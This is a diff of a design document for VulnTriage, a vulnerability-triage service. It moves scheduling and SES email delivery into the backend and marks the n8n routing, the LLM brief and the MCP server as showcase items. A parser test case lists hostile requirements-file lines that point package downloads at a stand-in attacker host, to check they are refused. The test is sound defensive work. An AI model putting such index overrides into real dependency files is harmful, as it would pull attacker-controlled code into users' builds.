@@ -8,25 +8,25 @@ Conventions: `VERIFY:` marks an external detail not yet confirmed. The ASSUMPTIO
 
 | Component | Responsibility | Workflow steps owned | User stories | Talks to | Tier |
 |---|---|---|---|---|---|
-| React frontend | Dashboard: assets, findings per asset, rank reason, brief or "brief unavailable", status and audit trail, risk acceptance, sign-in. All backend calls in one service layer. | none (shows results; starts registration and manual re-scan through the API) | US-1, US-4, US-5, US-6, US-10, US-11 | FastAPI backend (HTTPS, session cookie) | A |
-| FastAPI backend | The only owner of VulnTriage data. Asset registration, repository read, lockfile parsing, OSV matching, KEV/EPSS enrichment, scoring, brief generation with the guardrail, status changes and audit trail, routing jobs for n8n, the API for frontend, n8n, MCP server and responder. | inventory, match, enrich, prioritise, brief, re-scan; creates route jobs | US-1, US-2, US-3, US-4, US-5, US-6, US-7, US-8, US-9, US-10, US-11, US-12, US-13, US-14 | VulnTriage database (SQLAlchemy: SQLite in development, Postgres in Compose and AWS); OSV; CISA KEV; FIRST EPSS; GitHub repository read; LLM provider; OpenTelemetry Collector | A |
+| React frontend | Dashboard: assets, findings per asset, rank reason, (showcase: brief or "brief unavailable"; for submission the structured finding), status and audit trail, risk acceptance, sign-in. All backend calls in one service layer. | none (shows results; starts registration and manual re-scan through the API) | US-1, US-4, US-5, US-6 (showcase, `_docs/roadmap-showcase.md`), US-10, US-11 | FastAPI backend (HTTPS, session cookie) | A |
+| FastAPI backend | The only owner of VulnTriage data. Asset registration, repository read, lockfile parsing, OSV matching, KEV/EPSS enrichment, scoring, (showcase: brief generation with the guardrail), status changes and audit trail, the top-tier owner notification (creates the NotificationJob, sends the email, records `notification.enqueue` and `notification.deliver`; decision H7), the daily refresh and re-scan schedule (scheduler in the backend's background worker, task 38), the API for frontend, MCP server and responder (and, in the showcase, n8n). | inventory, match, enrich, prioritise, (showcase: brief), re-scan; creates and delivers the top-tier notification job (showcase: creates route jobs for n8n) | US-1, US-2, US-3, US-4, US-5, US-6 (showcase), US-7, US-8, US-9, US-10, US-11, US-12, US-13, US-14 | VulnTriage database (SQLAlchemy: SQLite in development, Postgres in Compose and AWS); OSV; CISA KEV; FIRST EPSS; GitHub repository read; LLM provider (showcase, X4); OpenTelemetry Collector | A |
 | Postgres | VulnTriage's database in Compose and AWS. SQLite replaces it in local development and Tier A. | none | US-1, US-11 (persistence) | nothing; accepts connections only from the FastAPI backend | B |
-| n8n | Scheduled and event-driven routing: daily refresh and re-scan triggers, top-tier notification and tracker issue, reminders, escalation, weekly digest, closing tracker issues. Workflows exported as JSON. | route; triggers enrich refresh and re-scan | US-7, US-8, US-9, US-10, US-16 | FastAPI backend API (n8n token); SMTP relay; GitHub tracker repo `vuln-triage-findings`; OpenTelemetry Collector (VERIFY: n8n's own OpenTelemetry support) | B |
+| n8n (showcase, `_docs/roadmap-showcase.md`; not built for submission) | Scheduled and event-driven routing: daily refresh and re-scan triggers, top-tier notification and tracker issue, reminders, escalation, weekly digest, closing tracker issues. Workflows exported as JSON. | route; triggers enrich refresh and re-scan | US-7, US-8, US-9, US-10, US-16 | FastAPI backend API (n8n token); SMTP relay; GitHub tracker repo `vuln-triage-findings`; OpenTelemetry Collector (VERIFY: n8n's own OpenTelemetry support) | B |
 | MCP server | Four read-only tools for an AI assistant. | none | US-12 | FastAPI backend API (MCP read-only token); the MCP client over stdio | A |
-| LLM | Writes the brief text from structured fields; never decides anything. | brief (text only; the backend owns the step) | US-6 | nothing; called by the backend | A |
-| OpenTelemetry Collector | Receives OTLP from backend (and n8n if supported), drops non-allowlisted attributes, exports. | none | US-13 | Prometheus, Loki, Tempo | C |
+| LLM (showcase, `_docs/roadmap-showcase.md`; not built for submission) | Writes the brief text from structured fields; never decides anything. | brief (text only; the backend owns the step) | US-6 | nothing; called by the backend | A |
+| OpenTelemetry Collector | Receives OTLP from the backend (showcase: and n8n if supported), drops non-allowlisted attributes, exports. | none | US-13 | Prometheus, Loki, Tempo | C |
 | Prometheus | Metrics store; source of the US-14 alert metric. | none | US-13, US-14 | OpenTelemetry Collector (receives metrics) | C |
 | Loki | Structured log store. | none | US-13, US-15 | OpenTelemetry Collector (receives logs) | C |
 | Tempo | Trace store. | none | US-13 | OpenTelemetry Collector (receives traces) | C |
 | Grafana | Dashboards, the US-14 alert rule and its contact point. Behind authentication. | none | US-13, US-14, US-15 | Prometheus, Loki, Tempo (read); responder webhook | C |
 | Responder agent | Wakes on the US-14 alert, reproduces and fixes the defect, opens a pull request with a test. | none | US-15 | FastAPI backend API (responder read-only token); Grafana, Loki (viewer token); GitHub application repository (branch and pull request); its LLM provider | C |
-| CI/CD pipeline (GitHub Actions) | Tests on every pull request, image builds, Compose integration tests, deploy to dev, manual promotion of the same image to production. | none | US-15 (deploys the merged fix), US-16 (checks the exported workflows) | GitHub repository (read); Amazon ECR; AWS CloudFormation (OIDC deploy roles) | B |
+| CI/CD pipeline (GitHub Actions) | Tests on every pull request, image builds, Compose integration tests, deploy to dev, manual promotion of the same image to production. | none | US-15 (deploys the merged fix), US-16 (checks the exported workflows) | GitHub repository (read); GHCR (GitHub's container registry, public images); the AWS deploy role (GitHub OIDC, created by Terraform) that runs the deploy on the server | B |
 
-ASSUMPTION: (A1) tier placement: Tier A runs on SQLite with no Docker, so Postgres and n8n (Compose services) are Tier B; the MCP server runs on the developer's machine against the API and is Tier A.
+ASSUMPTION: (A1) tier placement: Tier A runs on SQLite with no Docker, so Postgres (a Compose service) is Tier B, as is n8n (showcase, not built for submission); the MCP server runs on the developer's machine against the API and is Tier A.
 
 Data ownership:
 - Only the backend reads or writes VulnTriage's database. Every other component reaches VulnTriage data through the API. The database credential exists only in the backend's environment, and the database sits on a network only the backend joins (Security boundaries, credential table).
-- n8n keeps its workflows, credentials and execution history in its own store on its own volume; Grafana keeps users, dashboards and alert state in its own store on its own volume. Neither uses VulnTriage's database or schema. ASSUMPTION: (A2) both use their default embedded store (VERIFY: n8n and Grafana default to SQLite files in their data directories). The exported JSON in `n8n/workflows/` is the source of truth; n8n imports it at start (VERIFY: n8n CLI workflow import).
+- Grafana keeps users, dashboards and alert state in its own store on its own volume; it does not use VulnTriage's database or schema. Showcase (n8n): n8n would keep its workflows, credentials and execution history in its own store on its own volume, also apart from VulnTriage's database. ASSUMPTION: (A2) Grafana (showcase: and n8n) use their default embedded store (VERIFY: n8n and Grafana default to SQLite files in their data directories). Showcase: the exported JSON in `n8n/workflows/` would be the source of truth; n8n imports it at start (VERIFY: n8n CLI workflow import).
 - The MCP server and the responder hold no VulnTriage data of their own; they call the API.
 
 ## Workflow
@@ -35,14 +35,14 @@ Data ownership:
 |---|---|---|---|
 | 1. Inventory | Backend | A person registers an asset (US-1); every re-scan | Repository files read with the read-only token; dependency entries and warnings stored |
 | 2. Match | Backend | Same run as step 1 | OSV queried per entry with a known version; advisories stored; findings created or updated (E4, E7, E9) |
-| 3. Enrich | Backend | Same run as step 1; the daily refresh n8n calls (US-7) | KEV and EPSS values attached per CVE from the cached copies; stale markers set on failure (E3) |
+| 3. Enrich | Backend | Same run as step 1; the daily refresh the backend scheduler runs (US-7; task 38; showcase: n8n calls it) | KEV and EPSS values attached per CVE from the cached copies; stale markers set on failure (E3) |
 | 4. Prioritise | Backend | After steps 2-3 in every scan, and after every refresh | Tier, rank and rank reason recomputed (Prioritisation) |
-| 5. Brief | Backend (calls the LLM) | A finding is created or its fixed version changes; P1 findings first | Brief stored as `available`, or the "brief unavailable" marker |
-| 6. Route | n8n (jobs created by the backend) | n8n polls the API for jobs; schedules for reminders and digest | Owner notification, tracker issue, reminders, escalation, digest, issue close (Routing and notifications) |
-| 7. Re-scan | Backend | n8n's daily schedule after the refresh, and a person's "Re-scan" action in the dashboard | Steps 1-5 again; findings set `fixed` (US-10), `withdrawn` or restored (E4), or reopened (E7) |
+| 5. Brief (showcase, `_docs/roadmap-showcase.md`; for submission the step is skipped and the notification carries the structured finding) | Backend (calls the LLM) | A finding is created or its fixed version changes; P1 findings first | Brief stored as `available`, or the "brief unavailable" marker |
+| 6. Route (for submission the backend delivers the top-tier owner notification, decision H7; showcase: n8n delivers the rest) | Backend (creates the job and sends the email); showcase: n8n | The top-tier job is created after steps 2-4; showcase: n8n polls the API for jobs and runs schedules for reminders and digest | Owner notification for submission; showcase adds tracker issue, reminders, escalation, digest, issue close (Routing and notifications) |
+| 7. Re-scan | Backend | The backend scheduler's daily run after the refresh (task 38; showcase: n8n's daily schedule), and a person's "Re-scan" action in the dashboard | Steps 1-5 again; findings set `fixed` (US-10), `withdrawn` or restored (E4), or reopened (E7) |
 
-ASSUMPTION: (A3) re-scans have two triggers, a daily schedule (n8n, after the KEV/EPSS refresh) and a person's on-demand action; registration starts the first scan.
-ASSUMPTION: (A4) scans and brief generation run as background jobs inside the backend, using a job table in VulnTriage's database and one worker; no separate broker.
+ASSUMPTION: (A3) re-scans have two triggers, a daily schedule (after the KEV/EPSS refresh) and a person's on-demand action; registration starts the first scan. For submission the backend scheduler runs the schedule (a scheduler in the backend's background worker, task 38 in `_docs/tasks.md`). Showcase (n8n is a showcase item, `_docs/roadmap-showcase.md`): the n8n schedule is not built for submission.
+ASSUMPTION: (A4) scans and brief generation (showcase: the brief part; the scan part stays) run as background jobs inside the backend, using a job table in VulnTriage's database and one worker; no separate broker.
 
 ## Ingestion and matching
 
@@ -73,7 +73,7 @@ Lockfile entries without a version get the "version unknown" treatment, includin
 
 Limit: nothing named in a requirements file is ever fetched. Enforced in the parser: it is a pure function from file text to entries and warnings, with no network client; `-r` includes are resolved by the repository reader, inside the repository only, after path normalisation (no `..` escape, no URL). Refused case (Stage 4 test): a file with `--index-url https://attacker.example/simple` and `pkg @ https://attacker.example/pkg.whl` produces two warnings and zero outbound requests (the test's network stub fails on any call).
 
-Version ordering (for "lowest version greater than", range checks and the guardrail):
+Version ordering (for "lowest version greater than", range checks and the fixed version; showcase: the brief guardrail):
 
 | Ecosystem | Rule | Library |
 |---|---|---|
@@ -106,8 +106,8 @@ Withdrawal: an advisory is withdrawn when OSV marks it so (VERIFY: OSV's `withdr
 | Advisory | osv_id, vulnerability_id, modified, withdrawn_at (nullable), summary, details, affected (ranges and events), references | belongs to Vulnerability. summary, details and references are untrusted data, stored as text and never rendered as links |
 | VulnerabilityAlias | alias_id (unique), vulnerability_id | Every advisory's primary id and every alias. A lookup by any id resolves `alias_id → vulnerability_id`, so a GHSA, PYSEC or CVE id returns the same findings (US-12, #9 finding 2) |
 | Signal | cve_id, kev_listed (nullable), kev_date_added, kev_fetched_at, kev_stale, epss_score (nullable), epss_percentile, epss_date, epss_fetched_at, epss_stale | per CVE; read by Findings through their Vulnerability |
-| Finding | id, asset_id, vulnerability_id, ecosystem, package; unique (asset_id, ecosystem, package, vulnerability_id); fixed_version (nullable = "no fixed version"), status, status_before_withdrawal (nullable, for the E4 restore), tier, rank_inputs, rank_reason, first_detected_at, current_lifecycle_id, fixed_at, stale, stale_since, signals_changed | belongs to Asset and Vulnerability; links to Dependencies; has Lifecycles, Briefs, AuditEntries |
-| Brief | id, finding_id, lifecycle_id, status (`available` or `unavailable`), rejection_reason (internal), summary, impact, remediation, fix_version (nullable), reference_link (built by VulnTriage), model, prompt_version, created_at | belongs to Finding |
+| Finding | id, asset_id, vulnerability_id, ecosystem, package; unique (asset_id, ecosystem, package, vulnerability_id); fixed_version (nullable = "no fixed version"), status, status_before_withdrawal (nullable, for the E4 restore), tier, rank_inputs, rank_reason, first_detected_at, current_lifecycle_id, fixed_at, stale, stale_since, signals_changed | belongs to Asset and Vulnerability; links to Dependencies; has Lifecycles, (showcase: Briefs), AuditEntries |
+| Brief (showcase, `_docs/roadmap-showcase.md`; not built for submission) | id, finding_id, lifecycle_id, status (`available` or `unavailable`), rejection_reason (internal), summary, impact, remediation, fix_version (nullable), reference_link (built by VulnTriage), model, prompt_version, created_at | belongs to Finding |
 | Lifecycle | id, finding_id, number, started_at (first detection, or the E7 reopen time), due_at, highest_tier, entered_p1_at, tracker_issue_number, owner_notified_at, ended_at | belongs to Finding; has NotificationJobs. US-8 idempotency basis |
 | NotificationJob | id, lifecycle_id (nullable for the digest), kind (`top tier`, `reminder`, `escalation`, `signals changed`, `issue close`, `digest`), recipient (`owner`, `security lead`), idempotency_key (unique), state (`pending`, `claimed`, `sent`, `failed`, `held: ownerless`, `held: owner email missing`, `held: configuration error`), attempts, last_error_code, traceparent (set at creation, never null), created_at, sent_at | belongs to Lifecycle |
 | AuditEntry | id, finding_id or asset_id, field, previous_value (nullable: none on creation), new_value, actor (user id, `re-scan` or `system`), source (`dashboard`, `OSV`, ...), reason (required for `risk accepted`), restores_entry_id (nullable, E4), created_at | append-only; belongs to Finding or Asset |
@@ -139,7 +139,7 @@ Field names in the right-hand column are the Data model's; the wire spelling is 
 |---|---|
 | `ScanStatus = "scanned" \| "scan_error" \| "not_scanned"` | `Asset.scan_status`: the five asset scan status values, plus `Asset.scan_failure_reason` (nullable, one of the four failure reasons) |
 | `FindingStatus` value `risk_accepted` | `risk accepted` (exact spec string) |
-| `ServiceErrorCode`: `validation`, `not_found`, `conflict`, `unauthenticated` | No code for an authenticated caller who isn't allowed. Cases that need a 403: risk acceptance with the n8n API token, and a job retry `POST` with the responder API token (both in the Security boundaries credential table); an asset owner accepting risk on another owner's asset (Security boundaries, dashboard authentication paragraph, A30; the status code is #23's). The MCP token write is "a 4xx" (credential table, US-12), so #23 may use the same code for it. The existing codes cover the other refused cases: expired session 401 (`unauthenticated`), whitespace-only reason 422 (`validation`), a second claim of a claimed job (`conflict`) |
+| `ServiceErrorCode`: `validation`, `not_found`, `conflict`, `unauthenticated` | No code for an authenticated caller who isn't allowed. Cases that need a 403: a write with the responder API token (`I-RESP-WRITE`: a job claim or retry `POST`, or risk acceptance; Security boundaries credential table; showcase: the same for the n8n API token, and for the MCP token, whose write refusal is "a 4xx", US-12); an asset owner accepting risk on another owner's asset (Security boundaries, dashboard authentication paragraph, A30; the status code is #23's). Showcase (US-12): #23 may use the same code for the MCP token write. The existing codes cover the other refused cases: expired session 401 (`unauthenticated`), whitespace-only reason 422 (`validation`), showcase (n8n): a second claim of a claimed job (`conflict`) |
 | `User { id, name, email }` | `User.username`, `display_name`, `email`, `role` (`security lead` or `asset owner`); `password_hash` and Sessions stay server-side |
 | `Asset` fields | Same fields, plus `scan_failure_reason`, `last_scan_at`, `last_commit_sha`, and scan warnings (on `Scan.warnings`) |
 | No scan record | Scan entity per run: `trigger`, `started_at`, `finished_at`, `scan_status`, `failure_reason`, `warnings`, `trace_id` |
@@ -158,10 +158,10 @@ Field names in the right-hand column are the Data model's; the wire spelling is 
 | `fixedAt` | `Finding.fixed_at` (same) |
 | No lifecycle or notification state | Lifecycle (`highest_tier`, `entered_p1_at`, `tracker_issue_number`, `owner_notified_at`) and NotificationJob state |
 | No stale, signals-changed or withdrawal fields | `Finding.stale`, `stale_since`, `signals_changed` (E8), `status_before_withdrawal` (E4) |
-| `Finding.brief: Brief \| null`, one per finding; a rejected brief is `null` | Many Brief rows per finding, each with `lifecycle_id`, cached per (lifecycle, fixed version, prompt version, model) (A23); an `unavailable` brief is a stored row with `rejection_reason` (internal). Which brief the API returns is #23's decision |
-| `briefStatus: "available" \| "rejected"` | `Brief.status`: `available` or `unavailable` (the "brief unavailable" marker covers rejection, timeout and error) |
-| `Brief { summary, impact, remediation, advisoryReference }` | `summary`, `impact`, `remediation`, `fix_version` (nullable), `reference_link` (built by VulnTriage from the primary id), plus `model`, `prompt_version`, `created_at` |
-| `structuredSummary: string` | No counterpart: the structured finding is the finding's own fields, sent with the "brief unavailable" marker; no stored summary text |
+| (showcase) `Finding.brief: Brief \| null`, one per finding; a rejected brief is `null` | Many Brief rows per finding, each with `lifecycle_id`, cached per (lifecycle, fixed version, prompt version, model) (A23); an `unavailable` brief is a stored row with `rejection_reason` (internal). Which brief the API returns is #23's decision |
+| (showcase) `briefStatus: "available" \| "rejected"` | `Brief.status`: `available` or `unavailable` (the "brief unavailable" marker covers rejection, timeout and error) |
+| (showcase) `Brief { summary, impact, remediation, advisoryReference }` | `summary`, `impact`, `remediation`, `fix_version` (nullable), `reference_link` (built by VulnTriage from the primary id), plus `model`, `prompt_version`, `created_at` |
+| `structuredSummary: string` | No counterpart: the structured finding is the finding's own fields, sent (showcase: with the "brief unavailable" marker); no stored summary text |
 | No advisory text | `Advisory.summary`, `details`, `references`, sent only as labelled untrusted data |
 | `AuditEntry.who`, `when` | `AuditEntry.actor` (user id, `re-scan` or `system`) and `created_at` |
 | `AuditEntry.previousValue: string` | Nullable (none on creation, I7) |
@@ -220,9 +220,11 @@ Worked example (T = 0.10; all detected in the same scan, so step 3 ties):
 
 Ordering `P3`: step 1 puts `fnd-0002` (0.55) first, `fnd-0004` and `fnd-0005` (0.05) next, and `fnd-0003` (`n/a`) last. `fnd-0004` and `fnd-0005` tie at step 2 (both `high`) and step 3 (same scan); step 4 puts `fnd-0004` first. Final order: `fnd-0001`, `fnd-0002`, `fnd-0004`, `fnd-0005`, `fnd-0003`, `fnd-0006`.
 
-Partial owner: ASSUMPTION: (A21) an owner with an email but no name is notified at that email; an owner with a name but no email cannot be reached, so the notification is held (`held: owner email missing`) and the dashboard shows the missing field, while the GitHub issue is still opened once (as E2). The held state is internal to the backend: a `top tier` job for such an owner reaches n8n as `pending` with `recipient.email: null`, so n8n opens the GitHub issue once and sends no email (#27).
+Partial owner: ASSUMPTION: (A21) an owner with an email but no name is notified at that email; an owner with a name but no email cannot be reached, so the notification is held (`held: owner email missing`) and the dashboard shows the missing field (showcase: the GitHub issue is still opened once, as E2). The held state is internal to the backend: for submission the backend delivery worker sends no email for such a job and leaves it held. Showcase (n8n): the job reaches n8n as `pending` with `recipient.email: null`, so n8n opens the GitHub issue once and sends no email (#27).
 
 ## LLM brief
+
+Showcase (post-submission): the LLM brief below (US-6) is a showcase item (X4 in `_docs/roadmap-showcase.md`) and is not built for submission. For submission the owner notification and the dashboard carry the structured finding, with no brief.
 
 Inputs (structured fields only): primary id, aliases, ecosystem, package, installed version, fixed version for this dependency (or none), tier, rank reason, KEV value, EPSS, asset name, criticality, internet-facing, and the advisory `summary` as one labelled untrusted field. Never sent: `details`, references, owner contact, repository URL, lockfile content. ASSUMPTION: (A22) the advisory summary is included, truncated to 500 characters, because a brief without it can't say what the flaw is.
 
@@ -249,9 +251,13 @@ Guardrail, in order; the first failure rejects:
 
 ASSUMPTION: (A24) checks 3 and 4 are the output check beyond the fix version.
 
-Rejected-brief path: the brief is stored as `unavailable` with an internal rejection reason; a structured log event `brief.rejected` records finding id, reason code, model and trace id, and no advisory text or LLM output; the owner notification carries the structured finding with the "brief unavailable" marker. An LLM timeout, error or refusal takes the same path. The guardrail never blocks or delays a notification beyond the timeout. Refused case (Stage 4 test): with F = `1.2.5`, a stub returning `fix_version: "1.2.6"` gives `unavailable`, and the notification payload contains no brief field.
+Rejected-brief path (showcase): the brief is stored as `unavailable` with an internal rejection reason; a structured log event `brief.rejected` records finding id, reason code, model and trace id, and no advisory text or LLM output; the owner notification carries the structured finding with the "brief unavailable" marker (showcase: the marker). For submission the owner notification carries the structured finding and no brief. An LLM timeout, error or refusal takes the same path (showcase). The guardrail never blocks or delays a notification beyond the timeout. Refused case (Stage 4 test): with F = `1.2.5`, a stub returning `fix_version: "1.2.6"` gives `unavailable`, and the notification payload contains no brief field.
 
 ## Routing and notifications
+
+Showcase (post-submission): the n8n design below (workflows, polling, tracker issue, reminders, escalation, digest) is a showcase item, described in `_docs/roadmap-showcase.md`, and is not built for submission. For submission the backend delivers the top-tier owner notification itself and records `notification.enqueue` and `notification.deliver` (decision H7, 2026-10-22; the spec change is #98, the task is in #99).
+
+Email route from the deployed backend (human decision, 2026-10-22; spec Open question 3 and (A26) still apply: email, Amazon SES in AWS). The backend, not n8n, sends the email. In AWS it calls the Amazon SES API with the server's instance role, so there is no SMTP password and no email credential in the secret store. It sends from one verified sender address, because `sslip.io` hostnames cannot carry the DNS records that SES domain DKIM needs. The instance role gets only the send permission, limited to that one verified sender identity. In development and tests the backend sends to a MailHog container in the Compose stack, selected by a mail-transport setting; the development backend has no SES permission and no AWS credentials, so no development or test configuration can send to a real address. Refused case: a send from any address other than the verified sender is refused by SES (the role's permission is conditioned on the sender address), and in tests the backend refuses to send and delivers nothing. VERIFY: the SES sandbox allows only verified recipient addresses, so the demo recipient address must also be verified. VERIFY: the current SES free allowance and sending limits. VERIFY: the exact IAM action (`ses:SendEmail`, and whether `ses:SendRawEmail` is also needed), the resource form (the verified identity ARN) and the sender-address condition key (`ses:FromAddress`) for the role. VERIFY: the SES region that holds the verified identity. VERIFY: MailHog's image name and ports (web UI on 8025 and SMTP on 1025 are the usual ones). The MailHog service and the AWS SDK client are dependencies, ask before adding (tasks 24 and 37 in `_docs/tasks.md`).
 
 The backend decides what is due and creates NotificationJobs with a unique idempotency key; n8n delivers them and reports back. n8n never decides status or tier.
 
@@ -264,9 +270,9 @@ The backend decides what is due and creates NotificationJobs with a unique idemp
 | `weekly-digest` | Weekly | Fetch the digest; report | US-9 digest of open findings by rank to the security lead |
 | `close-tracker-issue` | Poll every 5 min | List `issue close` jobs; report | Comments on and closes the tracker issue after `fixed` |
 
-Idempotency (US-8): the basis is the finding lifecycle. The key is (lifecycle id, kind) for `top tier`, `signals changed` and `issue close`, (lifecycle id, kind, overdue week) for reminders and escalations, and the ISO week for the digest. A second claim of a claimed job is refused by the API. Before creating a tracker issue n8n reads the lifecycle's stored issue number, and if it is empty searches the tracker repo for the marker `vt-lifecycle:<id>` (VERIFY: GitHub issue search by text in a repository), so a crash between "create" and "record" can't open a second issue.
+Idempotency (US-8): the basis is the finding lifecycle. The key is (lifecycle id, kind) for `top tier`, `signals changed` and `issue close`, (lifecycle id, kind, overdue week) for reminders and escalations, and the ISO week for the digest. Showcase (n8n): a second claim of a claimed job is refused by the API. Before creating a tracker issue n8n reads the lifecycle's stored issue number, and if it is empty searches the tracker repo for the marker `vt-lifecycle:<id>` (VERIFY: GitHub issue search by text in a repository), so a crash between "create" and "record" can't open a second issue.
 
-ASSUMPTION: (A25) the poll and schedule intervals above, with the refresh at 06:00 UTC and the digest on Monday 08:00 UTC. ASSUMPTION: (A26) the pilot channel is email (spec Open question 3), sent over SMTP: a local mail catcher in development (for example Mailpit, dependency, ask before adding) and Amazon SES in AWS (VERIFY: SES sandbox limits recipients to verified addresses). ASSUMPTION: (A27) US-9 windows (spec Open question 2): `P1` 7 days, `P2` 14 days, `P3` 30 days, `P4` 90 days; the reminder and the escalation go at the due time and again weekly while the finding stays overdue.
+ASSUMPTION: (A25, showcase: n8n) the poll and schedule intervals above, with the refresh at 06:00 UTC and the digest on Monday 08:00 UTC. ASSUMPTION: (A26) the pilot channel is email (spec Open question 3), sent by the backend: to a MailHog container in the Compose stack in development and tests (dependency, ask before adding), and through the Amazon SES API with the instance role from one verified sender in AWS (VERIFY: SES sandbox limits recipients to verified addresses; details in the email route paragraph above). ASSUMPTION: (A27) US-9 windows (spec Open question 2): `P1` 7 days, `P2` 14 days, `P3` 30 days, `P4` 90 days; the reminder and the escalation go at the due time and again weekly while the finding stays overdue.
 
 Missing security-lead contact (I10): the backend validates `SECURITY_LEAD_NAME` and `SECURITY_LEAD_EMAIL` at startup and before creating any escalation or digest job. If either is missing or invalid, the backend still starts, `/health` reports the configuration error, every dashboard page shows a configuration-error banner to signed-in users, a log event and metric record it, and escalation and digest jobs are created as `held: configuration error` and sent once the contact is set; nothing is dropped. ASSUMPTION: (A28) this handling.
 
@@ -275,15 +281,17 @@ Missing security-lead contact (I10): the backend validates `SECURITY_LEAD_NAME` 
 | Call | How it is called | Cached | Refreshed | Failure (E3) |
 |---|---|---|---|---|
 | OSV | `POST https://api.osv.dev/v1/querybatch` per scan, then `GET https://api.osv.dev/v1/vulns/{id}` per new or modified advisory. No key. VERIFY: endpoints, batch size limit, rate limit, licence terms. | Advisories in VulnTriage's database by id and `modified`; refetched when `modified` changes (VERIFY: the batch answer carries `modified`) | Every scan | Timeout 10 s, two retries; then E3: `scan failed`, `feed unavailable`, findings kept and marked stale |
-| CISA KEV | `GET https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json` (whole catalogue). VERIFY: URL, fields `cveID` and `dateAdded`, licence, conditional GET support. | Catalogue copy with fetch time; per-CVE Signal rows | Daily (n8n), and at backend start if no copy exists | Last-known values kept, `kev_stale` set; next run retries |
-| FIRST EPSS | `GET https://api.first.org/data/v1/epss?cve=<list>` for CVEs that have findings. VERIFY: URL, batch size, fields `epss`, `percentile`, `date`, rate limit, attribution terms. | Per-CVE score and date in Signal | Daily (n8n), and on a scan for CVEs with no score | Last-known values kept, `epss_stale` set; next run retries |
+| CISA KEV | `GET https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json` (whole catalogue). VERIFY: URL, fields `cveID` and `dateAdded`, licence, conditional GET support. | Catalogue copy with fetch time; per-CVE Signal rows | Daily (backend scheduler; showcase: n8n), and at backend start if no copy exists | Last-known values kept, `kev_stale` set; next run retries |
+| FIRST EPSS | `GET https://api.first.org/data/v1/epss?cve=<list>` for CVEs that have findings. VERIFY: URL, batch size, fields `epss`, `percentile`, `date`, rate limit, attribution terms. | Per-CVE score and date in Signal | Daily (backend scheduler; showcase: n8n), and on a scan for CVEs with no score | Last-known values kept, `epss_stale` set; next run retries |
 | GitHub repository read | Contents API with the read-only token. VERIFY: endpoint, rate limit for fine-grained tokens. | Not cached; each scan reads the default branch head and records the commit SHA | Every scan | `scan failed`, `repository unavailable`; findings kept |
-| GitHub tracker issues | n8n, issues API on `vuln-triage-findings` with the tracker token. VERIFY: endpoints. | Issue number stored per lifecycle through the API | Per job | Job stays `pending` or `failed` and is retried; a top-tier owner notification that misses its window fires US-14 |
-| LLM provider | Backend, HTTPS API, pinned model, `LLM_MODE=stub` in tests. VERIFY: endpoint, limits, pricing, data retention. | Brief per (lifecycle, fixed version, prompt version, model) | When inputs change | "brief unavailable" path |
-| SMTP / Amazon SES | n8n sends email. VERIFY: SES SMTP endpoint and sending limits. | none | Per job | Job `failed`, retried each poll; US-14 alert if a top-tier job misses its window |
-| AWS at runtime | Secrets Manager read at container start (VERIFY), ECR image pulls at deploy, SES as above. | none | At start or deploy | Container doesn't start; the deploy fails and CloudFormation rolls back (VERIFY) |
+| GitHub tracker issues (showcase: n8n; not built for submission) | n8n, issues API on `vuln-triage-findings` with the tracker token. VERIFY: endpoints. | Issue number stored per lifecycle through the API | Per job | Job stays `pending` or `failed` and is retried; a top-tier owner notification that misses its window fires US-14 |
+| LLM provider (showcase, X4; not built for submission) | Backend, HTTPS API, pinned model, `LLM_MODE=stub` in tests. VERIFY: endpoint, limits, pricing, data retention. | Brief per (lifecycle, fixed version, prompt version, model) | When inputs change | "brief unavailable" path |
+| Amazon SES API (MailHog in development and tests) | The backend sends email through the SES API with the server's instance role, from one verified sender address (Routing and notifications, email route; showcase: n8n sends over its own mail node). VERIFY: SES API operation, region and sending limits. | none | Per job | Job `failed`, retried on the next delivery attempt; US-14 alert if a top-tier job misses its window |
+| AWS at runtime | Secrets Manager read at container start (VERIFY), GHCR image pulls at deploy (public images, no pull credential; VERIFY), SES as above. | none | At start or deploy | Container doesn't start; the deploy fails and the previous containers keep running until the deploy command succeeds (VERIFY: `docker compose up -d` leaves running containers in place when a pull fails) |
 
 ## MCP server
+
+Showcase (post-submission): the MCP server below (US-12) is a showcase item (X5 in `_docs/roadmap-showcase.md`) and is not built for submission.
 
 Transport and placement: Python, stdio, run by the developer's AI assistant on their machine (Python MCP SDK, dependency, ask before adding; VERIFY: SDK and transport). ASSUMPTION: (A29) stdio and not deployed to AWS; `get_asset` includes the owner's name and email.
 
@@ -304,28 +312,28 @@ Secrets: none in the repository, images or telemetry; `.env.example` lists names
 
 | Secret | Development | CI | AWS |
 |---|---|---|---|
-| Repository read token, tracker token, LLM keys, SMTP credentials, service tokens (n8n `N8N_API_TOKEN`, MCP `MCP_API_TOKEN`, responder `RESPONDER_API_TOKEN`), database password, Grafana admin password | `.env`, git-ignored, never read by agents | Not needed: tests use stubs. Only the OIDC role ARNs are stored, as repository variables | AWS Secrets Manager, read at container start by the instance role (VERIFY); passed as environment, never logged |
+| Repository read token, service token (responder `RESPONDER_API_TOKEN`), database password, Grafana admin password, the responder's LLM key (local Compose only, not deployed for submission); showcase only: the backend's LLM key (X4, the brief), MCP `MCP_API_TOKEN`, tracker token, SMTP credentials, n8n `N8N_API_TOKEN`. No email credential exists for submission: SES uses the instance role and development sends to MailHog | `.env`, git-ignored, never read by agents | Not needed: tests use stubs. Only the OIDC role ARNs are stored, as repository variables | AWS Secrets Manager, read at container start by the instance role (VERIFY); passed as environment, never logged |
 
 Credentials:
 
 | Credential | Can | Cannot | Enforced by | Refused request (Stage 4 test or manual check) |
 |---|---|---|---|---|
 | Repository read-only token (backend) | Read contents of the pilot repositories | Write anything; read issues or other repositories | GitHub fine-grained token: `contents: read` on selected repositories (VERIFY) | A `PUT` to the contents API with it is refused |
-| Tracker token (n8n) | Create, comment on and close issues in `vuln-triage-findings` | Push code, change settings, touch other repositories | GitHub fine-grained token: `issues: read/write` on that repository only (VERIFY, spec US-8) | A `git push` to `vuln-triage-findings` with it is refused |
-| n8n API token | List, claim and report jobs; start refresh and re-scan; fetch the weekly digest | Set any finding status, including `risk accepted`; edit assets; read users | API authorisation (role `n8n`, endpoint allowlist) | Risk acceptance with it gets 403 and no state change |
-| MCP API token | GET the read endpoints the four tools use | Any write | API authorisation (role `mcp-read`, GET only) | `POST` to the assets endpoint gets 403 `forbidden` and no state change (US-12) |
